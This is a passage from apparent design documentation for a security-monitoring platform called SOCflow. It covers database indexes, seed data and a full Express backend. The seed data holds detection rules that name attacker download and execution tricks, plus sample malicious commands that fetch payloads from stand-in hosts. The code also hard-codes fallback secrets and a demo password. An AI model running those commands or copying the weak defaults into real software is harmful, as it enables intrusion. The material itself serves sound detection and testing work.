      AND table_name = tableName
      AND index_name = indexName;
    IF indexCount = 0 THEN
        SET @sql = CONCAT('CREATE INDEX ', indexName, ' ON ', tableName, '(', columnList, ')');
        PREPARE stmt FROM @sql;
        EXECUTE stmt;
        DEALLOCATE PREPARE stmt;
    END IF;
END //
DELIMITER ;

CALL CreateIndexIfNotExists('soc_process_event', 'idx_process_host_time', 'host_id, timestamp');
CALL CreateIndexIfNotExists('soc_alert_reference', 'idx_alert_status_time', 'status, timestamp');
CALL CreateIndexIfNotExists('soc_case', 'idx_case_status_created', 'status, created_at');
CALL CreateIndexIfNotExists('soc_case_alerts', 'idx_case_alerts_case', 'case_id');
CALL CreateIndexIfNotExists('soc_case_alerts', 'idx_case_alerts_alert', 'alert_id');
CALL CreateIndexIfNotExists('soc_audit_log', 'idx_audit_user_time', 'user_id, timestamp');
DROP PROCEDURE IF EXISTS CreateIndexIfNotExists;
```

**Rationale**

| Index | Hot Query It Serves | Source Endpoint |
|---|---|---|
| `idx_process_host_time` | `ORDER BY e.timestamp DESC` hunts & host timelines | `/api/logs/all`, `/api/logs/search` |
| `idx_alert_status_time` | alert feed filtered by status sorted by time | `/api/alerts`, feed filters |
| `idx_case_status_created` | case sidebar status tabs | `GET /api/cases?status=` |
| `idx_case_alerts_*` | case↔alert junction both directions | case detail |
| `idx_audit_user_time` | per-user audit review | `GET /api/audit-logs` |

## 6.4 Seed Data (verbatim, schema tail)

```sql
INSERT IGNORE INTO soc_role (role_id, role_name, description) VALUES
(1, 'Manager', 'System manager: enroll endpoints, manage users, configure detection rules'),
(2, 'Analyst',  'SOC analyst: alerts, cases, log queries, forensic investigations');

INSERT IGNORE INTO soc_login (login_id, role_id, full_name, email, phone,
                              password_hash, status) VALUES
(1, 1, 'SOC Manager', 'manager@socflow.local', '555-0101', 'SEED_PENDING', 'active'),
(2, 2, 'SOC Analyst', 'analyst@socflow.local', '555-0102', 'SEED_PENDING', 'active');

INSERT IGNORE INTO soc_host (host_id, asset_name, hostname, ip_address, os_name,
                             os_version, environment, criticality, status) VALUES
(1, 'Finance Server',  'FIN-SRV-01',  '192.168.1.10', 'Windows Server 2019', '1809', 'prod', 'high', 'active'),
(2, 'Dev Workstation', 'DEV-WKST-04', '192.168.1.55', 'Windows 10',          '21H2', 'lab',  'low',  'active');

INSERT IGNORE INTO soc_agent (agent_id, host_id, agent_uuid, agent_name, agent_version,
                              status, last_seen, install_time) VALUES
(1, 1, '550e8400-e29b-41d4-a716-446655440000', 'SOCflow-Agent-Win', '2.0.0', 'active', CURRENT_TIMESTAMP, CURRENT_TIMESTAMP),
(2, 2, '550e8400-e29b-41d4-a716-446655440001', 'SOCflow-Agent-Win', '2.0.0', 'active', CURRENT_TIMESTAMP, CURRENT_TIMESTAMP);

INSERT IGNORE INTO soc_user_host (user_id, host_id, access_level) VALUES
(2, 1, 'editor'),
(2, 2, 'viewer');

INSERT IGNORE INTO soc_detection_rule (rule_id, rule_name, description, technique,
    severity_default, logic_type, rule_content) VALUES
(1,  'CertUtil File Download',
     'Detects certutil.exe abused as a downloader using -urlcache or -split flags (T1105)',
     'T1105', 'high', 'keyword',
     'process_name:certutil AND command_line_any:urlcache|-urlcache|split'),
(2,  'CertUtil Decode',
     'Detects certutil.exe used to decode obfuscated files via -decode flag (T1140)',
     'T1140', 'medium', 'keyword',
     'process_name:certutil AND command_line_any:-decode|/decode'),
(3,  'PowerShell Encoded Command',
     'Detects PowerShell executing Base64-encoded commands via -enc or -encodedcommand (T1059.001)',
     'T1059.001', 'high', 'keyword',
     'process_name:powershell AND command_line_any:-enc|-encodedcommand'),
(4,  'PowerShell Download Cradle',
     'Detects PowerShell downloading and executing remote content in-memory (T1059.001 fileless delivery)',
     'T1059.001', 'critical', 'keyword',
     'process_name:powershell AND command_line_any:downloadstring|downloadfile|webclient|invoke-webrequest|iwr'),
(5,  'PowerShell Execution Bypass',
     'Detects PowerShell invoked with security-bypass flags to evade policy controls (T1059.001)',
     'T1059.001', 'high', 'keyword',
     'process_name:powershell AND command_line_any:bypass|-nop|-windowstyle hidden|-noninteractive'),
(6,  'MSHTA Remote Execution',
     'Detects MSHTA loading remote HTA content or executing inline scripts (T1218.005)',
     'T1218.005', 'critical', 'keyword',
     'process_name:mshta AND command_line_any:http://|https://|javascript:|vbscript:'),
(7,  'Regsvr32 COM Scriptlet (Squiblydoo)',
     'Detects regsvr32 used to execute remote COM scriptlets, bypassing AppLocker (T1218.010)',
     'T1218.010', 'critical', 'keyword',
     'process_name:regsvr32 AND command_line_any:scrobj.dll|http://|https://|/u|/i:'),
(8,  'WMIC Process Creation',
     'Detects WMIC used to create or manage processes remotely (T1047)',
     'T1047', 'high', 'keyword',
     'process_name:wmic AND command_line_any:process call create|/node:|shadowcopy|/format:'),
(9,  'Msiexec Remote Package Install',
     'Detects msiexec silently installing packages from remote URLs (T1218.007)',
     'T1218.007', 'high', 'keyword',
     'process_name:msiexec AND command_line_any:http://|https://|/q|/quiet|/i'),
(10, 'Rundll32 Script Execution',
     'Detects rundll32 executing scripts or loading DLLs from unusual locations (T1218.011)',
     'T1218.011', 'high', 'keyword',
     'process_name:rundll32 AND command_line_any:javascript:|http://|shell32|advpack|url.dll'),
(11, 'BITSAdmin File Transfer',
     'Detects bitsadmin used to transfer files via BITS jobs, evading network monitoring (T1197)',
     'T1197', 'high', 'keyword',
     'process_name:bitsadmin AND command_line_any:/transfer|/addfile|/download|/upload'),
(12, 'Scheduled Task Persistence',
     'Detects schtasks creating scheduled tasks for persistence or execution (T1053.005)',
     'T1053.005', 'medium', 'keyword',
     'process_name:schtasks AND command_line_any:/create|/sc|/tr|/ru'),
(13, 'Net User Account Manipulation',
     'Detects net.exe adding users or modifying local administrator group membership (T1136, T1087)',
     'T1136', 'high', 'keyword',
     'process_name:net AND command_line_any:user /add|localgroup administrators'),
(14, 'WScript Remote Script Execution',
     'Detects WScript/CScript loading remote scripts or specifying a script engine explicitly (T1059.005)',
     'T1059.005', 'high', 'keyword',
     'process_name:wscript|cscript AND command_line_any:http://|https://|.vbs|/e:vbscript|/e:javascript');

INSERT IGNORE INTO soc_process_event (event_id, host_id, agent_id, provider, event_type,
    timestamp, user_name, process_name, command_line) VALUES
(1, 1, 1, 'Sysmon', 'ProcessCreate', CURRENT_TIMESTAMP, 'SYSTEM',
 'certutil.exe',
 'certutil.exe -urlcache -split -f http://malware.example.com/payload.exe C:\Windows\Temp\payload.exe'),
(2, 2, 2, 'Sysmon', 'ProcessCreate', CURRENT_TIMESTAMP, 'User1',
 'powershell.exe',
 'powershell.exe -enc ZWNobyAiSGFja2VkIjsgSW52b2tlLVdlYlJlcXVlc3QgaHR0cDovL2MydGVzdC5leGFtcGxlLmNvbS9ydW4ucHMx');

INSERT IGNORE INTO soc_audit_log (user_id, action_type, object_type, object_id, details) VALUES
(1, 'SYSTEM_INIT', 'SYSTEM', NULL, '{"message": "SOCflow database initialized"}');
```

## 6.5 Password Bootstrap — `SEED_PENDING` trick

The seed rows carry the literal string `SEED_PENDING` in `password_hash`. On every boot
the backend detects non-bcrypt hashes and rehashes the shared demo password
(`SOCflow2026!`, cost 10) — see §7.4. This keeps the seeded DB portable without
committing a hash that would be valid for other deployments.

**DB state observed at QA** (§16.11): 2 logins (active), 2 hosts, 2 agents, 14 rules
(all `enabled=1` after rule-toggle regression), 3 alerts (critical/high/medium —
seeded during QA for render testing, §17.4), 1 case with 2 linked alerts and 1 note.

## 6.6 Data-Integrity Tests Performed (§16.11)

```sql
-- FK cascade sanity (executed in QA):
INSERT INTO soc_case_alerts (case_id, alert_id) VALUES (1, 999);  -- expect FK error
DELETE FROM soc_host WHERE host_id=999;                          -- expect 0 affected
SELECT COUNT(*) FROM soc_alert_reference;                        -- seeded QA count = 3
```

# 7. Backend Implementation

Module: `backend/server.js` (685 lines, CommonJS Express app), plus two thin middlewares.
The full file is reproduced verbatim below with section anchors, exactly as adapted after
the QA fixes in §17 (the `matched_text` column fix is the only functional change vs. the
original listing in §7.5).

## 7.1 Full Source — `backend/server.js`

```javascript
const express = require('express');
const mysql = require('mysql2/promise');
const fs = require('fs');
const path = require('path');
const bcrypt = require('bcrypt');
const cors = require('cors');
const crypto = require('crypto');
const AdmZip = require('adm-zip');
const session = require('express-session');
const redis = require('redis');
require('dotenv').config();

const { requireAuth, requireRole } = require('./middleware/auth');
const audit = require('./middleware/audit');

const ENROLLMENT_SECRET = process.env.ENROLLMENT_SECRET || 'SOCflow-Enroll-2026!';
const PORT = process.env.PORT || 5001;

let pool = null;
let redisClient = null;

async function initRedis() {
    if (!process.env.REDIS_URL) return;                    // optional dependency
    try {
        redisClient = redis.createClient({ url: process.env.REDIS_URL });
        redisClient.on('error', (err) => console.error('Redis error:', err));
        await redisClient.connect();
        console.log('Connected to Redis.');
    } catch (err) {
        console.error('Failed to connect to Redis:', err.message);
    }
}

async function dbRun(sql, params = []) {                   // INSERT/UPDATE/DELETE
    try {
        const [result] = await pool.execute(sql, params);
        return { lastID: result.insertId, changes: result.affectedRows };
    } catch (err) {
        console.error('DB Error:', err.message, sql);
        throw err;
    }
}

async function dbAll(sql, params = []) {                   // SELECT list
    try {
        const [rows] = await pool.query(sql, params);
        return rows;
    } catch (err) {
        console.error('DB Error:', err.message, sql);
        throw err;
    }
}

async function dbGet(sql, params = []) {                   // SELECT row or null
    try {
        const [rows] = await pool.query(sql, params);
        return rows.length > 0 ? rows[0] : null;
    } catch (err) {
        console.error('DB Error:', err.message, sql);
        throw err;
    }
}

async function rehashSeededPasswords() {                   // §6.5 SEED_PENDING boot
    const SEED_PASSWORD = 'SOCflow2026!';
    try {
        const users = await dbAll('SELECT login_id, password_hash FROM soc_login');
        for (const user of users) {
            const isReal = user.password_hash &&
                user.password_hash.startsWith('$2b$') &&
                user.password_hash.length === 60;
            if (!isReal) {
                const hash = await bcrypt.hash(SEED_PASSWORD, 10);
                await dbRun('UPDATE soc_login SET password_hash = ? WHERE login_id = ?',
                    [hash, user.login_id]);
                console.log(`Rehashed password for user_id=${user.login_id}`);
            }
        }
    } catch (err) {
        console.error('Password rehash error:', err.message);
    }
}

async function initDB() {
    try {
        pool = mysql.createPool({
            host: process.env.DB_HOST || '127.0.0.1',
            user: process.env.DB_USER || 'root',
            password: process.env.DB_PASSWORD || '',
            database: process.env.DB_NAME || 'socflow',
            waitForConnections: true,
            connectionLimit: 10,
            queueLimit: 0
        });
        await pool.getConnection(); // test connection
        console.log('Connected to MySQL database.');
    } catch (err) {
        console.error('DB error:', err.message);
        process.exit(1);                                   // fail-fast: no DB, no service
    }
}

const app = express();
app.use(cors({ origin: true, credentials: true }));
app.use(express.json());

app.use(session({
    secret: process.env.SESSION_SECRET || 'socflow-secret-key-2026',
    resave: false,
    saveUninitialized: false,
    cookie: {
        maxAge: 30 * 60 * 1000,        // 30 minutes
        httpOnly: true,                // not readable by JS
        secure: false,                 // set true behind TLS termination
        sameSite: 'lax'                // CSRF-hardening for same-site navigations
    }
}));

app.post('/api/login', async (req, res) => {
    const { email, password } = req.body;
    const ip = req.ip || req.connection.remoteAddress;
    try {
        const user = await dbGet(
            'SELECT l.*, r.role_name FROM soc_login l JOIN soc_role r ON l.role_id = r.role_id WHERE l.email = ?',
            [email]
        );
        if (!user) {
            await audit.logAuditAction(null, 'failed_login', 'USER', null, { email }, ip);
            return res.status(401).json({ error: 'Invalid credentials' });
        }
        if (user.status !== 'active') {
            return res.status(403).json({ error: 'Account disabled' });
        }
        const match = await bcrypt.compare(password, user.password_hash);
        if (!match) {
            await audit.logAuditAction(user.login_id, 'failed_login', 'USER', user.login_id, { email }, ip);
            return res.status(401).json({ error: 'Invalid credentials' });
        }
        await dbRun('UPDATE soc_login SET last_login = NOW() WHERE login_id = ?', [user.login_id]);
        req.session.user = {
            id: user.login_id,
            name: user.full_name,
            email: user.email,
            role: user.role_name
        };
        await audit.logAuditAction(user.login_id, 'login', 'USER', user.login_id, { email }, ip);
        return res.json({
            success: true,
            role: user.role_name.toLowerCase(),
            user: { id: user.login_id, name: user.full_name, email: user.email }
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/logout', requireAuth, async (req, res) => {
    const userId = req.session.user.id;
    const ip = req.ip || req.connection.remoteAddress;
    await audit.logAuditAction(userId, 'logout', 'USER', userId, {}, ip);
    req.session.destroy(() => res.json({ success: true }));
});

app.get('/api/me', requireAuth, async (req, res) => {
    res.json({ user: req.session.user });
});

app.get('/api/alerts', requireAuth, async (req, res) => {
    try {
        const rows = await dbAll(`
            SELECT a.alert_id, a.timestamp, a.severity, a.description, a.status,
                   a.confidence_score, h.hostname as host, r.rule_name, r.technique
            FROM soc_alert_reference a
            LEFT JOIN soc_host h ON a.host_id = h.host_id
            LEFT JOIN soc_detection_rule r ON a.rule_id = r.rule_id
            ORDER BY a.timestamp DESC LIMIT 50
        `);
        res.json(rows);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.get('/api/stats', requireAuth, async (req, res) => {
    try {
        const alerts = await dbAll('SELECT severity, COUNT(*) as count FROM soc_alert_reference GROUP BY severity');
        const hosts = await dbGet('SELECT COUNT(*) as count FROM soc_host WHERE status = ?', ['active']);
        const newAlerts = await dbGet('SELECT COUNT(*) as count FROM soc_alert_reference WHERE status = ?', ['new']);
        res.json({ alerts, hosts: hosts ? hosts.count : 0, new_alerts: newAlerts ? newAlerts.count : 0 });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.get('/api/alerts/:id', requireAuth, async (req, res) => {
    try {
        const alert = await dbGet(`
            SELECT a.alert_id, a.timestamp, a.severity, a.description, a.status,
                   a.confidence_score, a.detection_source,
                   h.hostname as host, h.ip_address, h.os_name,
                   r.rule_name, r.technique, r.description as rule_description,
                   e.event_id, e.process_name, e.command_line, e.user_name, e.pid, e.ppid
            FROM soc_alert_reference a
            LEFT JOIN soc_host h ON a.host_id = h.host_id
            LEFT JOIN soc_detection_rule r ON a.rule_id = r.rule_id
            LEFT JOIN soc_process_event e ON a.event_ref_id = e.event_id
            WHERE a.alert_id = ?
        `, [req.params.id]);
        if (!alert) return res.status(404).json({ error: 'Alert not found' });
        res.json(alert);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/alerts/:id/ack', requireAuth, requireRole('Analyst'), async (req, res) => {
    try {
        await dbRun('UPDATE soc_alert_reference SET status = ? WHERE alert_id = ?',
            ['open', req.params.id]);
        audit.logAuditAction(req.session.user.id, 'ACK_ALERT', 'ALERT', req.params.id, {}, req.ip);
        res.json({ message: 'Alert acknowledged' });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.get('/api/cases', requireAuth, async (req, res) => {
    try {
        const { status, priority } = req.query;
        let sql = 'SELECT * FROM soc_case';
        const params = [];
        const conds = [];
        if (status)   { conds.push('status = ?');   params.push(status); }
        if (priority) { conds.push('priority = ?'); params.push(priority); }
        if (conds.length) sql += ' WHERE ' + conds.join(' AND ');
        sql += ' ORDER BY created_at DESC';
        const rows = await dbAll(sql, params);
        res.json(rows);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.get('/api/cases/:id', requireAuth, async (req, res) => {
    try {
        const caseId = req.params.id;
        const caseData = await dbGet('SELECT * FROM soc_case WHERE case_id = ?', [caseId]);
        if (!caseData) return res.status(404).json({ error: 'Case not found' });

        const alerts = await dbAll(`
            SELECT a.*, r.rule_name, h.hostname
            FROM soc_alert_reference a
            JOIN soc_case_alerts ca ON a.alert_id = ca.alert_id
            JOIN soc_detection_rule r ON a.rule_id = r.rule_id
            JOIN soc_host h ON a.host_id = h.host_id
            WHERE ca.case_id = ?
        `, [caseId]);

        const notes = await dbAll(`
            SELECT n.*, l.full_name as analyst_name
            FROM soc_case_note n
            LEFT JOIN soc_login l ON n.author_id = l.login_id
            WHERE n.case_id = ?
            ORDER BY n.created_at ASC
        `, [caseId]);

        res.json({ ...caseData, alerts, notes });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/cases', requireAuth, async (req, res) => {
    const { title, description, priority } = req.body;
    try {
        await dbRun(
            "INSERT INTO soc_case (title, description, priority, status, created_by) VALUES (?, ?, ?, 'open', ?)",
            [title, description, priority || 'medium', req.session.user.id]
        );
        audit.logAuditAction(req.session.user.id, 'CREATE_CASE', 'CASE', null, { title }, req.ip);
        res.json({ message: 'Case created' });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.put('/api/cases/:id', requireAuth, async (req, res) => {
    const { status, priority, description } = req.body;
    try {
        const updates = [];
        const params = [];
        if (status)      { updates.push('status = ?');      params.push(status); }
        if (priority)    { updates.push('priority = ?');    params.push(priority); }
        if (description) { updates.push('description = ?'); params.push(description); }
        if (!updates.length) return res.status(400).json({ error: 'No fields to update' });
        params.push(req.params.id);
        await dbRun(`UPDATE soc_case SET ${updates.join(', ')} WHERE case_id = ?`, params);
        res.json({ message: 'Case updated' });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/cases/:id/notes', requireAuth, async (req, res) => {
    const { note_text } = req.body;
    try {
        await dbRun(
            'INSERT INTO soc_case_note (case_id, author_id, note_text) VALUES (?, ?, ?)',
            [req.params.id, req.session.user.id, note_text]
        );
        res.json({ message: 'Note added' });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/cases/:id/alerts', requireAuth, async (req, res) => {
    const { alert_id } = req.body;
    try {
        const existing = await dbGet(
            'SELECT id FROM soc_case_alerts WHERE case_id = ? AND alert_id = ?',
            [req.params.id, alert_id]
        );
        if (existing) return res.status(409).json({ error: 'Alert already linked' });
        await dbRun('INSERT INTO soc_case_alerts (case_id, alert_id) VALUES (?, ?)',
            [req.params.id, alert_id]);
        res.json({ message: 'Alert linked to case' });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.get('/api/hosts', requireAuth, async (req, res) => {
    try {
        const rows = await dbAll(`
            SELECT h.*,
                CASE WHEN h.last_seen > NOW() - INTERVAL 60 SECOND
                     THEN 'online' ELSE 'offline' END AS connectivity_status
            FROM soc_host h ORDER BY h.last_seen DESC
        `);
        res.json(rows);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/hosts/add', requireAuth, requireRole('Manager'), async (req, res) => {
    const { hostname, ip_address } = req.body;
    try {
        await dbRun(
            "INSERT INTO soc_host (hostname, ip_address, status, environment, criticality) VALUES (?, ?, 'active', 'prod', 'medium')",
            [hostname, ip_address]
        );
        const host = await dbGet('SELECT host_id FROM soc_host WHERE hostname = ?', [hostname]);
        if (host) {
            await dbRun(
                "INSERT INTO soc_user_host (user_id, host_id, access_level) VALUES (?, ?, 'owner')",
                [req.session.user.id, host.host_id]
            );
        }
        audit.logAuditAction(req.session.user.id, 'ADD_HOST', 'HOST', host ? host.host_id : null,
            { hostname }, req.ip);
        res.json({ message: 'Host added' });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.get('/api/agents', requireAuth, async (req, res) => {
    try {
        const rows = await dbAll(`
            SELECT a.agent_id, a.agent_uuid, a.agent_name, a.agent_version, a.status, a.last_seen,
                   h.hostname, h.ip_address, h.os_name,
                   CASE WHEN a.last_seen > NOW() - INTERVAL 60 SECOND
                        THEN 'online' ELSE 'offline' END AS connectivity_status
            FROM soc_agent a
            JOIN soc_host h ON a.host_id = h.host_id
            ORDER BY a.last_seen DESC
        `);
        res.json(rows);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.get('/api/rules', requireAuth, async (req, res) => {
    try {
        const rows = await dbAll('SELECT * FROM soc_detection_rule ORDER BY severity_default DESC, rule_name');
        res.json(rows);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.put('/api/rules/:id', requireAuth, requireRole('Manager'), async (req, res) => {
    const { enabled } = req.body;
    try {
        await dbRun("UPDATE soc_detection_rule SET enabled = ?, updated_at = NOW() WHERE rule_id = ?",
            [enabled ? 1 : 0, req.params.id]);
        audit.logAuditAction(req.session.user.id, 'UPDATE_RULE', 'RULE', req.params.id,
            { enabled }, req.ip);
        res.json({ message: 'Rule updated' });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.get('/api/users', requireAuth, requireRole('Manager'), async (req, res) => {
    try {
        const rows = await dbAll(`
            SELECT l.login_id as id, l.full_name as name, l.email,
                   r.role_name as role, l.status, l.last_login,
                   UPPER(SUBSTR(l.full_name, 1, 2)) as initials
            FROM soc_login l JOIN soc_role r ON l.role_id = r.role_id
            ORDER BY l.created_at DESC
        `);
        const mapped = rows.map(u => ({
            ...u,
            role: u.role.toUpperCase(),
            status: u.status.toUpperCase()
        }));
        res.json(mapped);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/users', requireAuth, requireRole('Manager'), async (req, res) => {
    const { full_name, email, password, role_id } = req.body;
    if (!full_name || !email || !password || !role_id) {
        return res.status(400).json({ error: 'Missing required user fields' });
    }
    try {
        const existing = await dbGet('SELECT login_id FROM soc_login WHERE email = ?', [email]);
        if (existing) return res.status(409).json({ error: 'User with this email already exists' });

        const hash = await bcrypt.hash(password, 10);
        const result = await dbRun(
            "INSERT INTO soc_login (role_id, full_name, email, password_hash, status, created_at) VALUES (?, ?, ?, ?, 'active', NOW())",
            [role_id, full_name, email, hash]
        );
        audit.logAuditAction(req.session.user.id, 'CREATE_USER', 'USER', result.lastID,
            { email, role_id }, req.ip);
        res.json({ message: 'User created successfully', user_id: result.lastID });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.patch('/api/users/:id/status', requireAuth, requireRole('Manager'), async (req, res) => {
    const { status } = req.body;
    if (!['active', 'inactive'].includes(status)) {
        return res.status(400).json({ error: 'Invalid status value' });
    }
    try {
        await dbRun('UPDATE soc_login SET status = ? WHERE login_id = ?', [status, req.params.id]);
        audit.logAuditAction(req.session.user.id, 'UPDATE_USER_STATUS', 'USER', req.params.id,
            { status }, req.ip);
        res.json({ message: 'User status updated' });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.get('/api/reports/summary', requireAuth, requireRole('Manager'), async (req, res) => {
    try {
        const alertStats = await dbAll('SELECT severity, COUNT(*) as count FROM soc_alert_reference GROUP BY severity');
        const ruleStats = await dbAll(`
            SELECT r.rule_name, r.technique, COUNT(a.alert_id) as alert_count
            FROM soc_detection_rule r
            LEFT JOIN soc_alert_reference a ON r.rule_id = a.rule_id
            GROUP BY r.rule_id
            ORDER BY alert_count DESC LIMIT 5
        `);
        const hostStats = await dbAll(`
            SELECT h.hostname, COUNT(a.alert_id) as alert_count
            FROM soc_host h
            LEFT JOIN soc_alert_reference a ON h.host_id = a.host_id
            GROUP BY h.host_id
            ORDER BY alert_count DESC LIMIT 5
        `);
        const totalCases = await dbGet('SELECT COUNT(*) as count FROM soc_case');
        const closedCases = await dbGet("SELECT COUNT(*) as count FROM soc_case WHERE status = 'closed'");

        res.json({
            generated_at: new Date().toISOString(),
            alerts_by_severity: alertStats,
            top_rules: ruleStats,
            top_hosts: hostStats,
            cases: {
                total: totalCases ? totalCases.count : 0,
                closed: closedCases ? closedCases.count : 0
            }
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.get('/api/audit-logs', requireAuth, requireRole('Manager'), async (req, res) => {
    try {
        const rows = await dbAll(`
            SELECT a.*, l.full_name as user_name, l.email as user_email
            FROM soc_audit_log a
            LEFT JOIN soc_login l ON a.user_id = l.login_id
            ORDER BY a.timestamp DESC LIMIT 100
        `);
        res.json(rows);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.get('/api/logs/all', requireAuth, async (req, res) => {
    try {
        const rows = await dbAll(`
            SELECT e.event_id, e.timestamp, e.process_name, e.command_line,
                   e.user_name, e.pid, e.ppid, h.hostname
            FROM soc_process_event e
            JOIN soc_host h ON e.host_id = h.host_id
            ORDER BY e.timestamp DESC LIMIT 100
        `);
        res.json(rows);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/logs/search', requireAuth, async (req, res) => {
    const { query, host, user, process } = req.body;
    try {
        let sql = `
            SELECT e.event_id, e.timestamp, e.process_name, e.command_line, e.user_name, h.hostname
            FROM soc_process_event e JOIN soc_host h ON e.host_id = h.host_id
            WHERE 1=1
        `;
        const params = [];
        if (host)    { sql += ' AND h.hostname LIKE ?';  params.push(`%${host}%`); }
        if (user)    { sql += ' AND e.user_name LIKE ?';  params.push(`%${user}%`); }
        if (process) { sql += ' AND e.process_name LIKE ?'; params.push(`%${process}%`); }
        if (query)   { sql += ' AND (e.command_line LIKE ? OR e.process_name LIKE ?)';
                       params.push(`%${query}%`, `%${query}%`); }
        sql += ' ORDER BY e.timestamp DESC LIMIT 100';
        const rows = await dbAll(sql, params);
        res.json(rows);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.get('/api/connection/verify', async (req, res) => {
    res.json({ status: 'ok', server: 'SOCflow', timestamp: new Date().toISOString() });
});

app.post('/api/enroll', async (req, res) => {
    const { hostname, password, os_info } = req.body;
    if (password !== ENROLLMENT_SECRET) {
        return res.status(403).json({ error: 'Invalid enrollment password' });
    }
    try {
        let hostId;
        const host = await dbGet('SELECT host_id FROM soc_host WHERE hostname = ?', [hostname]);
        if (host) {
            hostId = host.host_id;
            await dbRun("UPDATE soc_host SET last_seen = NOW(), status = 'active' WHERE host_id = ?",
                [hostId]);
        } else {
            await dbRun(
                "INSERT INTO soc_host (hostname, environment, criticality, status, os_name) VALUES (?, 'prod', 'medium', 'active', ?)",
                [hostname, os_info || 'Unknown']
            );
            const newHost = await dbGet('SELECT host_id FROM soc_host WHERE hostname = ?', [hostname]);
            hostId = newHost ? newHost.host_id : null;
        }
        const agentUuid = crypto.randomUUID();
        const agentKey = crypto.randomBytes(32).toString('hex');
        await dbRun(
            "INSERT INTO soc_agent (host_id, agent_uuid, agent_name, agent_version, status, last_seen) VALUES (?, ?, 'SOCflow-Agent', '2.0.0', 'active', NOW())",
            [hostId, agentUuid]
        );
        console.log(`Agent enrolled: ${hostname} (${agentUuid})`);
        res.json({ status: 'success', agent_id: agentUuid, agent_key: agentKey });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/telemetry', async (req, res) => {
    const { agent_id } = req.body;
    try {
        const agent = await dbGet('SELECT agent_id FROM soc_agent WHERE agent_uuid = ?', [agent_id]);
        if (!agent) return res.status(404).json({ error: 'Agent not found' });
        await dbRun("UPDATE soc_agent SET last_seen = NOW() WHERE agent_uuid = ?", [agent_id]);
        await dbRun("UPDATE soc_host SET last_seen = NOW() WHERE host_id = (SELECT host_id FROM soc_agent WHERE agent_uuid = ?)", [agent_id]);
        res.json({ status: 'processed' });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/logs', async (req, res) => {
    const { agent_id, logs } = req.body;
    if (!logs || !Array.isArray(logs)) return res.status(400).json({ error: 'Invalid logs format' });

    try {
        const agent = await dbGet('SELECT agent_id, host_id FROM soc_agent WHERE agent_uuid = ?', [agent_id]);
        if (!agent) return res.status(404).json({ error: 'Agent not found' });

        for (const log of logs) {
            const result = await dbRun(`
                INSERT INTO soc_process_event
                    (host_id, agent_id, provider, event_type, timestamp, process_name, command_line, user_name)
                    VALUES (?, ?, 'Sysmon', 'ProcessCreate', NOW(), ?, ?, ?)
            `, [agent.host_id, agent.agent_id, log.process_name, log.command_line, log.user || 'SYSTEM']);

            if (redisClient) {
                const eventObj = {
                    event_id: result.lastID,
                    host_id: agent.host_id,
                    agent_id: agent.agent_id,
                    provider: 'Sysmon',
                    event_type: 'ProcessCreate',
                    process_name: log.process_name,
                    command_line: log.command_line,
                    user_name: log.user || 'SYSTEM',
                    timestamp: new Date().toISOString()
                };
                await redisClient.lPush('socflow_events_queue', JSON.stringify(eventObj));
            }
        }

        res.json({ status: 'processed', count: logs.length });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.get('/api/agent/download', requireAuth, requireRole('Manager'), async (req, res) => {
    try {
        const zip = new AdmZip();
        const agentFolder = path.join(__dirname, '../agent');
        const files = ['agent_core.py', 'connect.py', 'install.ps1', 'install.py',
                       'requirements.txt', 'simulate_attack.ps1', 'simulate_attack.py'];
        for (const f of files) {
            try { zip.addLocalFile(path.join(agentFolder, f)); } catch (_) {}
        }
        const data = zip.toBuffer();
        res.set('Content-Type', 'application/octet-stream');
        res.set('Content-Disposition', 'attachment; filename=SOCflow_Agent_Installer.zip');
        res.set('Content-Length', data.length);
        res.send(data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to create agent bundle' });
    }
});

app.get('/api/vulnerabilities', requireAuth, async (req, res) => {
    res.json([
        { id: 1, cve: 'CVE-2024-38063', severity: 'critical', host: 'FIN-SRV-01', description: 'Windows TCP/IP Remote Code Execution', status: 'pending' },
        { id: 2, cve: 'CVE-2023-34362', severity: 'high',     host: 'DEV-WKST-04', description: 'MOVEit Transfer SQL Injection', status: 'mitigated' },
        { id: 3, cve: 'CVE-2024-21412', severity: 'medium',   host: 'FIN-SRV-01', description: 'Internet Shortcut Security Bypass', status: 'open' },
        { id: 4, cve: 'CVE-2024-30044', severity: 'critical', host: 'DEV-WKST-04', description: 'SharePoint Server RCE', status: 'pending' }
    ]);
});

app.get('/api/threat-map', requireAuth, async (req, res) => {
    res.json({
        globalThreatLevel: 'MODERATE',
        lastUpdate: new Date().toISOString(),
        nodes: [
            { id: 1, lat: 40.7128,  lng: -74.0060,  city: 'New York',   hostCount: 12, threatLevel: 'low' },
            { id: 2, lat: 51.5074,  lng: -0.1278,   city: 'London',     hostCount: 8,  threatLevel: 'medium' },
            { id: 3, lat: 35.6762,  lng: 139.6503,  city: 'Tokyo',      hostCount: 15, threatLevel: 'high' },
